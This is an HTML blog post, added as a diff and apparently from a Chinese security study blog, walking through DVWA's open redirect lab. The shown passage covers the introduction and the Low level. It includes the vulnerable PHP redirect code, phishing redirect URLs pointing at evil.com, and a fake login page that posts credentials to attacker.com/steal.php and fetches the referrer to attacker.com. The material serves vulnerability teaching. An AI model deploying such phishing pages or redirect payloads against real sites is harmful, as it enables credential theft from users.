@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是开放重定向（Open Redirect）？开放重定向漏洞允许攻击者控制应用程序的重定向目标，将用户重定向到任意外部网站。虽然看似危害较小，但可用于钓鱼攻击和绕过安全控制。 HTTP重定向机制： 12345678&#x2F;&#x2F; 方法1：HTTP响应头header(&quot;Locatio">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - Open HTTP Redirect (开放重定向) 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/Open_HTTP_Redirect_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是开放重定向（Open Redirect）？开放重定向漏洞允许攻击者控制应用程序的重定向目标，将用户重定向到任意外部网站。虽然看似危害较小，但可用于钓鱼攻击和绕过安全控制。 HTTP重定向机制： 12345678&#x2F;&#x2F; 方法1：HTTP响应头header(&quot;Locatio">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.127Z">
+<meta property="article:modified_time" content="2025-11-20T15:27:11.665Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/Open_HTTP_Redirect_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - Open HTTP Redirect (开放重定向) 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/Open_HTTP_Redirect_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - Open HTTP Redirect (开放重定向) 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:27:11" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>17k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>15 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是开放重定向（Open-Redirect）？"><a href="#什么是开放重定向（Open-Redirect）？" class="headerlink" title="什么是开放重定向（Open Redirect）？"></a>什么是开放重定向（Open Redirect）？</h3><p>开放重定向漏洞允许攻击者控制应用程序的重定向目标，将用户重定向到任意外部网站。虽然看似危害较小，但可用于钓鱼攻击和绕过安全控制。</p>
+<p><strong>HTTP重定向机制：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法1：HTTP响应头</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: https://example.com&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：HTML meta标签</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;0;url=https://example.com&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3：JavaScript</span></span><br><span class="line">window.location = <span class="string">&quot;https://example.com&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击场景：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">合法使用：</span><br><span class="line">https:<span class="regexp">//</span>example.com<span class="regexp">/redirect?url=https:/</span><span class="regexp">/example.com/</span>success</span><br><span class="line">→ 重定向到同域名的成功页面</span><br><span class="line"></span><br><span class="line">恶意利用：</span><br><span class="line">https:<span class="regexp">//</span>example.com<span class="regexp">/redirect?url=https:/</span><span class="regexp">/evil.com/</span>phishing</span><br><span class="line">→ 重定向到钓鱼网站</span><br></pre></td></tr></table></figure>
+
+<p><strong>危害：</strong></p>
+<ol>
+<li><p><strong>钓鱼攻击</strong></p>
+<ul>
+<li>用户信任合法域名</li>
+<li>被重定向到伪造网站</li>
+<li>输入凭证被窃取</li>
+</ul>
+</li>
+<li><p><strong>绕过安全控制</strong></p>
+<ul>
+<li>绕过URL黑名单</li>
+<li>绕过SSRF防护</li>
+<li>绕过CSP策略</li>
+</ul>
+</li>
+<li><p><strong>会话劫持</strong></p>
+<ul>
+<li>重定向时泄露Session ID</li>
+<li>Referer头包含敏感信息</li>
+</ul>
+</li>
+<li><p><strong>恶意软件分发</strong></p>
+<ul>
+<li>利用信任关系传播恶意软件</li>
+</ul>
+</li>
+</ol>
+<p><strong>利用链：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 攻击者发送：https:<span class="regexp">//</span>bank.com<span class="regexp">/redirect?url=https:/</span><span class="regexp">/evil.com/</span>fake-login</span><br><span class="line"><span class="number">2</span>. 用户点击（信任bank.com域名）</span><br><span class="line"><span class="number">3</span>. 自动重定向到evil.com</span><br><span class="line"><span class="number">4</span>. 用户看到伪造的登录页面</span><br><span class="line"><span class="number">5</span>. 输入凭证 → 被窃取</span><br></pre></td></tr></table></figure>
+
+<p><strong>DVWA场景：</strong><br>一个登录后的重定向功能，用于跳转到指定页面。</p>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全不验证重定向目标，可重定向到任意URL。</p>
+<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否有重定向参数</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在</span></span><br><span class="line"><span class="comment">// $_GET[&#x27;redirect&#x27;] - 从URL获取重定向参数</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接获取用户输入，无任何验证 ★★★</span></span><br><span class="line">    <span class="comment">// 攻击者可以指定任意URL</span></span><br><span class="line">    <span class="comment">// 例如：?redirect=https://evil.com</span></span><br><span class="line">    <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接重定向到用户指定的URL ★★★</span></span><br><span class="line">    <span class="comment">// header() - 设置HTTP响应头</span></span><br><span class="line">    <span class="comment">// Location - 重定向到指定URL</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 不检查URL是否是内部链接</span></span><br><span class="line">    <span class="comment">// 2. 不检查URL是否是合法域名</span></span><br><span class="line">    <span class="comment">// 3. 不验证URL格式</span></span><br><span class="line">    <span class="comment">// 4. 攻击者可以重定向到任何网站</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>( <span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 应该调用exit()停止脚本执行 ★★★</span></span><br><span class="line">    <span class="comment">// 但这里没有，可能导致额外问题</span></span><br><span class="line">    <span class="comment">// exit;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HTML表单：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Redirect<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Redirect Example<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 合法使用：重定向到内部页面 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?redirect=success.php&quot;</span>&gt;</span>Go to success page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?redirect=dashboard.php&quot;</span>&gt;</span>Go to dashboard<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- ★★★ 恶意利用：重定向到外部网站 ★★★ --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 攻击者可以构造这样的链接 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;a href=&quot;?redirect=https://evil.com/phishing&quot;&gt;Click here&lt;/a&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>无URL验证</strong> - 接受任意URL</li>
+<li><strong>无域名检查</strong> - 不限制目标域名</li>
+<li><strong>无协议检查</strong> - http、https、javascript:都接受</li>
+<li><strong>无白名单</strong> - 没有允许的URL列表</li>
+</ol>
+<p><strong>攻击数据流：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户输入: ?redirect=https:<span class="regexp">//</span>evil.com</span><br><span class="line">    ↓</span><br><span class="line">直接获取: <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>]</span><br><span class="line">    ↓</span><br><span class="line">直接重定向: header(<span class="string">&quot;Location: $redirect&quot;</span>)</span><br><span class="line">    ↓</span><br><span class="line">浏览器跳转: https:<span class="regexp">//</span>evil.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：基础重定向攻击"><a href="#步骤1：基础重定向攻击" class="headerlink" title="步骤1：基础重定向攻击"></a>步骤1：基础重定向攻击</h4><p><strong>测试1：重定向到外部网站</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=https:<span class="regexp">//g</span>oogle.com</span><br><span class="line">结果：成功重定向到Google</span><br><span class="line"></span><br><span class="line">URL: ?redirect=https:<span class="regexp">//</span>evil.com</span><br><span class="line">结果：成功重定向到恶意网站</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：构造钓鱼攻击"><a href="#步骤2：构造钓鱼攻击" class="headerlink" title="步骤2：构造钓鱼攻击"></a>步骤2：构造钓鱼攻击</h4><p><strong>创建伪造登录页面（evil.com&#x2F;fake-login.html）：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DVWA Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 模仿DVWA的样式 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.login-box</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">button</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#007bff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-box&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Session Expired<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please login again:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://attacker.com/steal.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 可选：窃取Referer中的信息</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/log.php?ref=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">referrer</span>));</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击链接：</strong></p>
